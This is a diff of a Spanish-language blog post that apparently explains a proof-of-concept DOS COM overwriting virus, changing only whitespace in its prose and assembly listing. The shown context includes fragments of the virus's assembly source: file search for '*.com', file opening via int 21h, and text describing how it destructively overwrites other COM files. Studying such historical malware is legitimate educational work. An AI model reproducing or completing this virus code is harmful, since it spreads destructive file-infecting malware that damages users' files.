@@ -13,7 +13,7 @@ de ejecución.
 
 ## Método de infección
 El virus simplemente sobrescribe otros archivos COM con el código viral. Es la estrategia
- más primitiva, pero es muy agresiva y destructiva. Todas las generaciones del 
+más primitiva, pero es muy agresiva y destructiva. Todas las generaciones del 
 virus son idénticas.
 
 ![infection](/assets/images/poc-virus-x86dos-com-overwriting/infection.png){:width="350"}
@@ -149,7 +149,7 @@ Se utilizan 6 servicios de la DOS API mediante la interrupción de software 21h.
 
                 assume  cs:virus, ds:virus
 
-      virus     segment byte public 'CODE'
+       virus    segment byte public 'CODE'
 
                 org     100h
 
@@ -182,7 +182,7 @@ infect_file:    mov     ah, 3Dh               ; | AH = 3Dh
 
                 jmp     find_next             ; buscar siguiente
 
-      exit:     mov     ah, 00h               ; | AH = 00h
+       exit:    mov     ah, 00h               ; | AH = 00h
                 int     21h                   ; |_DOS API - Retornar a DOS
 
   search_str    db      "*.com", 00h          ; nombre comodín de búsqueda
